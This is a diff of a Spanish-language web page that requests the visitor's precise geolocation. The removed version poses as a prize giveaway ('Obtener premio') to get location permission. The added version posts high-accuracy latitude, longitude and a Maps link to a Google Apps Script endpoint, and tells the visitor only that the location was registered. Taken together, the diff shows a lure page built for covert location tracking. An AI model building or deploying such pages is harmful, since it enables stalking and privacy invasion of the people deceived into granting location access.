@@ -1,98 +1,68 @@
-<!DOCTYPE html><html lang="es">
+<!DOCTYPE html>
+<html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Compartir y ganar</title>
-<style>
-body{
-font-family:Arial,sans-serif;
-background:#101820;
-color:white;
-text-align:center;
-padding:40px 20px;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prueba de Geolocalización</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #101820; color: white; text-align: center; padding: 40px 20px; }
+        .box { max-width: 420px; margin: auto; background: #1b2630; padding: 30px 20px; border-radius: 18px; }
+        button { width: 100%; padding: 16px; font-size: 18px; border: 0; border-radius: 12px; background: #25d366; color: white; font-weight: bold; cursor: pointer; }
+        #resultado { margin-top: 25px; line-height: 1.7; word-break: break-word; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>📍 Prueba de Ubicación</h2>
+    <p>Haz clic en el botón para compartir tu ubicación.</p>
+    <button onclick="obtenerYEnviarUbicacion()">Compartir Ubicación</button>
+    <div id="resultado"></div>
+</div>
+
+<script>
+// REEMPLAZA ESTA URL POR LA QUE COPIASTE DE GOOGLE APPS SCRIPT
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbx-jAEt4g03qo9B7ttQIwgzGl0YkpO0OCvOg7pbI5sMZDkHEf8VIgKeYPgbmdgPaj_TYQ/exec";
+
+function obtenerYEnviarUbicacion() {
+    const resultado = document.getElementById("resultado");
+
+    if (!navigator.geolocation) {
+        resultado.innerHTML = "❌ Tu navegador no soporta geolocalización.";
+        return;
+    }
+
+    resultado.innerHTML = "⏳ Obteniendo ubicación...";
+
+    navigator.geolocation.getCurrentPosition(
+        function(posicion) {
+            const lat = posicion.coords.latitude;
+            const lon = posicion.coords.longitude;
+            const precision = Math.round(posicion.coords.accuracy);
+            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            resultado.innerHTML = "✅ Ubicación registrada correctamente.";
+
+            // Enviar datos a Google Sheets mediante POST
+            fetch(WEB_APP_URL, {
+                method: "POST",
+                mode: "no-cors", // Requerido para peticiones cruzadas a Google Apps Script
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitud: lat,
+                    longitud: lon,
+                    precision: precision,
+                    mapa: mapa
+                })
+            }).catch(error => console.error("Error al enviar:", error));
+        },
+        function(error) {
+            resultado.innerHTML = "❌ Permiso denegado o no se pudo obtener la ubicación.";
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
 }
-.box{
-max-width:420px;
-margin:auto;
-background:#1b2630;
-padding:30px 20px;
-border-radius:18px;
-box-shadow:0 5px 20px rgba(0,0,0,.3);
-}
-button{
-width:100%;
-padding:16px;
-font-size:18px;
-border:0;
-border-radius:12px;
-background:#25d366;
-color:white;
-font-weight:bold;
-}
-#resultado{
-margin-top:25px;
-line-height:1.7;
-word-break:break-word;
-}
-a{
-color:#25d366;
-}
-</style>
-</head><body><div class="box"><h2>📍 Compartís y ganás!</h2><p>Presioná el botón para obtener tu premio.</p><button onclick="obtenerUbicacion()">Obtener premio</button>
+</script>
 
-<div id="resultado"></div></div><script>
-function obtenerUbicacion(){
-
-const resultado=document.getElementById("resultado");
-
-if(!navigator.geolocation){
-resultado.innerHTML="❌ Este navegador no permite obtener su premio.";
-return;
-}
-
-resultado.innerHTML="🛒🎁 Obteniendo premio...";
-
-navigator.geolocation.getCurrentPosition(
-
-function(posicion){
-
-const lat=posicion.coords.latitude;
-const lon=posicion.coords.longitude;
-const precision=Math.round(posicion.coords.accuracy);
-
-const mapa="https://www.google.com/maps?q="+lat+","+lon;
-
-resultado.innerHTML=
-"✅ Ubicación obtenida<br><br>"+
-"Latitud: "+lat+"<br>"+
-"Longitud: "+lon+"<br>"+
-"Precisión aproximada: "+precision+" metros<br><br>"+
-"<a href='"+mapa+"' target='_blank'>📍 Abrir ubicación en Google Maps</a>";
-
-},
-
-function(error){
-
-if(error.code===1){
-resultado.innerHTML="❌ No se otorgó permiso para acceder al premio.";
-}else if(error.code===2){
-resultado.innerHTML="❌ No se pudo determinar premio.";
-}else if(error.code===3){
-resultado.innerHTML="❌ Se agotó el tiempo para obtener el premio.";
-}else{
-resultado.innerHTML="❌ No se pudo obtener el premio.";
-}
-
-},
-
-{
-enableHighAccuracy:true,
-timeout:15000,
-maximumAge:0
-}
-
-);
-
-}
-</script></body>
+</body>
 </html>
